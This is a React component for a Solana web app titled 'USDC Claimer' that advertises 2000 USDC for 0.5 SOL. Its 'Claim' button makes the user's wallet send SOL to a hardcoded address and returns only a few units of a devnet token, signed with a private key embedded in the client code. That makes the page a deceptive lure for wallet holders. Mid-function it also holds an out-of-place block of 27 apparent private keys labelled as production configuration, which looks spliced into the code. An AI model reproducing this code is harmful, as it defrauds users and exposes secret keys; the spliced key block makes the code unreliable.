/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "29eUwfvNVpquS5MssqidMphqAcqtXnHkd1dBU5hC3zwY8QRzK6D6SCR95jJ3WpSHyuTSxDTKLBy6gDzewjKThbs9"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "NdSiMaCX51r8g64jCySeSxH73Cfjipye71UyGMGQchEn6gKqnjAcnj4i4Mcotei6v7eV3VDMeDktx5ZtS7sjNU7",
  "key1": "k12xPyANgWhF692vnfLaFuZdtyrGBN73W5WCtUyUWmixZw6dc6WeVGFWDQFWxamYikKAn3DNDtrjeyjksb9oLda",
  "key2": "3W8r1c4MyAL8Bv6MycVfi7mF1sEz6WXbGugPB7EzU9wZ7Q2yDxDZenaboyHapzRCDRJhcMu6LeBFeJoYEPZYiydW",
  "key3": "3tudhj7K5scKXaau5HDPPSgtcxGBN1evof8hRbjG4A6utWPojn4xuRBMBfYw4fy8WFhsZtJbjJTEFY3zQyuWgqK8",
  "key4": "2JPfjDdegY6KERt9c2DQTWvEoXQinoNyeH83n9rpKSma5A9z2TBQ9wnCGFbKwhELW8rsawrE8LwS1CSeStB6Gtr1",
  "key5": "4raDXfkMhNFHoBwaPZ6V43Pdb2RP8usWUpAAMQLxmxhZ5ce1tUH4ByaLifjhZitek8AZznc4T4BtKHzUaNoKvw8w",
  "key6": "j77Eo8sxRnUARAnpZmi4tQwUqRrNhRk2zfQFoNVemHYDXTBudCsM2W6mexFr53f6mb5xSyAfwsyu73bfDDM61mC",
  "key7": "5pyRPjKwrfxakq6MTZGQwk98y349pwSdahKZcGhdPiB17GXttru2uQUD7nb3eqvBHDzM2vF6kCJb6CSwRY1aSH3q",
  "key8": "4Ffg3m5ShYEGx7uLV3YWryZmGnrve8j9h44K2L15AbnQhvXQ8LcgDQ5PPb1a9j2cGTSkSAAqt2EeDkjyjXBNwzYp",
  "key9": "3rCmzqcZJ8BRNHj6hsic7HQ2yibaqgU5HT5GTeyUxmp2ioPh7XDS3fKLHDwwsLs5zGmMgVSWECK4Vrud4ENBgLUP",
  "key10": "5LBrH25pdASiaHp9hJYjMwzJHf7JNxLC1MfHkDoH6CkRUuoXVy7rh4j3WtgqhDgkDkZM9fngSkZXBACEVAWiZVFZ",
  "key11": "5EyR1c44YzmnDnRMrtbvWcs4Zk211UHqPGdRq9HkBoLEScuS8d6nqhSNdkoyHUKc3X8bjK9rVcahxYW6v7xZuYAs",
  "key12": "3XkTf4WduQAq2uCAG7g8tELZGEWf19JKecDVPqXNDLJHdCqLzV96e8UcnAP5LQdeLDjGCe2r3KE9pzMj1ebD7nzU",
  "key13": "2s4CZgJ6g6BdAMNq6xayk9U2Eh8G1GQfsiD9cJ6K1UVsBWMqC7riHwDPWkZKPfuf6LhDbzcvNeDor7vGNU5dSmHc",
  "key14": "5aqvX3ZDaUsdFGi38UCvhWYmdmeQLtys4ff5h4Y7RTDv9npQCNLqoYQyroWJRWKzPzvfqxRLkfG8oibKMEHW7mXV",
  "key15": "3Hh6UbfEYk2HZiu6ZsDJNwFDpNq1CWK5tTYQrofX2XozU1XGM2WVoWU9pJT8UpPqRvoeGncdbDTJEq5Pgd9U1eB6",
  "key16": "3oQ1rUSimjFa5z9borjhMgxnVyNHzjq595rSwj1UkvQBUXVZ5TANiDKZ2kVQCLNVUTWxsFxqFMVFGZbmmA97m6aQ",
  "key17": "3T18JMGMEyemM9AMuL29FUA6MMXZuMPZHrhk9XMUZzVqomqTSZPRG27LYscBxi9izTZDwvp2C9CjwkeurBD349Ji",
  "key18": "4pWhSHYpaxNfuJwi3hNQDFeFzaA27egX3syTGrgCbSwdCB9NvB42cUJYrpeKFVviDfqkMmmAxcTZrsAwerKwKvrc",
  "key19": "3CFznvkWATra1cqrDqBMYwQd8GYW7KGJwv11pj219BaJQdQNi3D12WgYT27GPqsdxtDrZjJRpxzrTjEvnY61fWUY",
  "key20": "3curNUrhR6gKtmjwujh7GngexYjnEtbtLachPF5TX1fU2jcgNamaNdtbtCCeh9BUCpX98tF8aMSCXkVa3zx2HLWi",
  "key21": "njShQg11FhVpB4ZpBeBjEHTcMB33AEdYVuHRWSuzPZ8cXy2zoHLB6b8GkdA15BWX7uswTYG9XZnktTnKZ4ba8h9",
  "key22": "4rb4zHBWULcYfdcPATHkfJyrBEx27eSDmMA1E9vTmLjz2rgigQkzws2MHb1LvKQM8QfGD77Endu6fbrKeHm8TGE7",
  "key23": "2DhdRMJQVXgzmbPXp2RWFHcpxZ45GfiMpThn5SCzWAUPB6jMQxJVHuYJb1VUhMzbebQY7Uy3CxFBLMQ6NvPtL1Vf",
  "key24": "2d6tPont2R8BA8jBp8DugEegVap3rixWX25eQmXpkkojmSeBxamFq6F2XtBujYzd9cHndB34wYFnv3dKWE2Gr31R",
  "key25": "8vG7VEkYcMZzmBnK2Y1w6LKK5EFyYU2xUaK9Me2rez1cK8TfBxQFkJQ2irqR19arQFvg67DJck9wvjJCuxUV98o",
  "key26": "5DZu1Hcy8TCLd6oiSEd4m9t9Cs94YfbGqo9bdrgBoga6BsuDWmnX32qLoEqDUcnPKrdwF586MDnko1xAmao3EC3W"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
